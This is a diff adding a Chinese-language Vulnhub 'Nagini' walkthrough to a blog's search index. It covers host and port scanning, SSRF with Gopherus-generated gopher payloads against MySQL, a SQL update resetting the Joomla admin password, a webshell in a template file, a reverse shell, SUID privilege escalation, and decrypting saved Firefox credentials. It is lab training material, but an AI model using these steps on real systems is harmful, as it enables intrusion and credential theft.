@@ -784,4 +784,78 @@
         <tag>溯源</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Nagini</title>
+    <url>/2022/01/20/Nagini/index/</url>
+    <content><![CDATA[<h1 id="Nagini打靶"><a href="#Nagini打靶" class="headerlink" title="Nagini打靶"></a>Nagini打靶</h1><h2 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h2><ol>
+<li>http3</li>
+<li>joomla漏洞</li>
+<li>ssrf+gopher协议</li>
+</ol>
+<hr>
+<p>攻击主机：<em>kali Linux 2021</em> 192.168.0.102</p>
+<p>目标：<em>Debian 192.168.0.101</em></p>
+<h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>arp-scan</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ sudo arp-scan -l</span><br><span class="line">[sudo] password for yifang: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:06:73:0c, IPv4: 192.168.0.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.0.1	c0:a5:dd:ab:6d:1e	SHENZHEN MERCURY COMMUNICATION TECHNOLOGIES CO.,LTD.</span><br><span class="line">192.168.0.20	60:ee:5c:c9:a5:d8	SHENZHEN FAST TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.0.101	08:00:27:0e:96:f2	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.357 seconds (108.61 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ nmap -sC -sV -p- 192.168.0.101</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-20 05:21 EST</span><br><span class="line">Nmap scan report for quic.nagini.hogwarts (192.168.0.101)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)</span><br><span class="line">|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)</span><br><span class="line">|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-目录爆破"><a href="#3-目录爆破" class="headerlink" title="3.目录爆破"></a>3.目录爆破</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ dirsearch -u http://192.168.0.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e php,txt,html -f</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, txt, html | HTTP method: GET | Threads: 30 | Wordlist size: 438225</span><br><span class="line"></span><br><span class="line">Output File: /home/yifang/.dirsearch/reports/192.168.0.101/_22-01-20_05-27-08.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/yifang/.dirsearch/logs/errors-22-01-20_05-27-08.log</span><br><span class="line"></span><br><span class="line">Target: http://192.168.0.101/</span><br><span class="line"></span><br><span class="line">[05:27:08] Starting: </span><br><span class="line">[05:27:08] 200 -   97B  - /index.html</span><br><span class="line">[05:27:09] 403 -  278B  - /icons/</span><br><span class="line">[05:27:32] 200 -  234B  - /note.txt</span><br><span class="line">[05:27:51] 301 -  315B  - /joomla  -&gt;  http://192.168.0.101/joomla/</span><br><span class="line">[05:27:51] 200 -    6KB - /joomla/</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-安装http3服务"><a href="#4-安装http3服务" class="headerlink" title="4.安装http3服务"></a>4.安装http3服务</h3><p>这台靶机需要安装http3，而目前市面上的浏览器也仅仅支持http2，所以就需要寻找一个新的http3的客户端</p>
+<p>由 <code>cloudfare</code>家开发的<code>quiche</code>可以进行对<code>http3</code>服务的访问，接下来进行安装</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ git clone --recursive https://github.com/cloudflare/quiche/</span><br><span class="line">➜  ~ sudo apt install cmake</span><br><span class="line">➜  ~ sudo apt install cargo</span><br><span class="line">➜  ~ cargo build --examples 			#(会产生报错)</span><br><span class="line">➜  ~ sudo apt purge rustc				#(处理报错)</span><br><span class="line">➜  ~ curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh #选择 1 选项</span><br><span class="line">➜  ~ source $HOME/.cargo/env</span><br><span class="line">➜  ~ cargo build --examples</span><br><span class="line">➜  ~ cargo test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201548159.png"></p>
+<p>安装好的客户端在 <code>/quiche/targer/debug/examples</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ vim /etc/hosts									#(先编辑hosts文件)</span><br><span class="line">➜  ~ cd /quiche/target/debug/examples</span><br><span class="line">➜  ~ ./http3-client https://quic.nagini.hogwarts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201559395.png"></p>
+<p>成功访问，得到的信息是目标存在一个 <code>internalResourceFeTcher.php</code>文件，而经过我的测试，他存在ssrf漏洞，且可以包含本地文件</p>
+<p>第二条消息的意思是，在目标服务器中存在某个 <code>.bak</code>后缀的文件，在通过百度+爆破后得到 <code>/joomla/configuration.php.bak</code>文件</p>
+<h3 id="5-信息泄露-gopher"><a href="#5-信息泄露-gopher" class="headerlink" title="5.信息泄露+gopher"></a>5.信息泄露+gopher</h3><p>首先介绍一下 <code>gopher</code>协议，gopher的使用条件是前台存在 <code>ssrf</code>漏洞，后端满足使用 <code>tcp</code>协议即可</p>
+<p>首先对目标的<code>ssrf</code>漏洞进行测试发包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201701196.png"></p>
+<p>测试内容为 <code>gopher：//127.0.0.1：22</code>对目标的<code>22</code>进行探测，出现以上反馈时，即为存在漏洞，</p>
+<p>然后查看刚才得到的配置文件，基本可以得到服务器的内部数据库配置信息</p>
+<p>现在试想：<code>gopher</code>协议是否能针对目标服务器进行操作呢？ 答案是肯定的</p>
+<p>gopher食用指南：<a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p>
+<p>现在安装 <code>Gopherus</code>工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus.git</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>gopherus</code>生成payload，进行测试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201706090.png"></p>
+<p>将生成的数据进行插入，然后得到以下回显，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201707383.png"></p>
+<p>然后对目标进行sql 查询</p>
+<p>成功获取数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201646180.png"></p>
+<p>但是，获得的密码是加密后的文件，怎么办？</p>
+<p>直接修改密码就行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use joomla; update joomla_users SET password=&#x27;e10adc3949ba59abbe56e057f20f883e&#x27; WHERE username=&#x27;site_admin&#x27;; 密文为md5(123456)</span><br></pre></td></tr></table></figure>
+
+<p>成功登录后台，<code>joomla</code>的上传webshell的思路与<code>wordpress</code>相似，可以先查看目标的模板文件，然后修改源码，上传webshell，而这里刚好可以修改 <code>protostar</code>模板的<code>error.php</code>文件</p>
+<p>然后我们监听php反弹shell<code>http://192.168.0.101/joomla/templates/protostar/error.php</code></p>
+<p>在kali中自带 <code>/usr/share/webshell</code>中有许多的webshell</p>
+<p><code>/bin/bash -i</code>反弹ptyshell</p>
+<h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6.提权"></a>6.提权</h3><p>在目标准寻找可以进行提权的文件，发先 <code>snape</code>用户家目录存在<code>.creds.txt</code>文件，然后解码获得 <code>snape</code>密码，成功登录</p>
+<p>接下来，使用<code>ssh</code>登录<code>snape</code>，然后<code>snape</code>可以访问<code>hermoine/bin</code>下的带有<code>suid</code>权限的su_cp文件，然后把snape下 <code>authorized_keys</code>文件放到hermoine的.ssh文件夹下，成功访问<code>hermoine</code>用户，然后在目录下发现浏览器的一些存储文件</p>
+<h4 id="浏览器密码恢复"><a href="#浏览器密码恢复" class="headerlink" title="浏览器密码恢复"></a>浏览器密码恢复</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ scp -rp hermoine@192.168.0.101:/home/hermoine/.mozilla /tmp</span><br></pre></td></tr></table></figure>
+
+<p>首先下载目标文件</p>
+<p>然后安装工具</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ~ git clonehttps://github.com/unode/firefox_decrypt.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201201818382.png"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 firefox_decrypt.py /tmp/.mozilla/firefox</span><br><span class="line">Website:   http://nagini.hogwarts</span><br><span class="line">Username: &#x27;root&#x27;</span><br><span class="line">Password: &#x27;@Alohomora#123&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>打靶结束</p>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub-middlum</tag>
+      </tags>
+  </entry>
 </search>
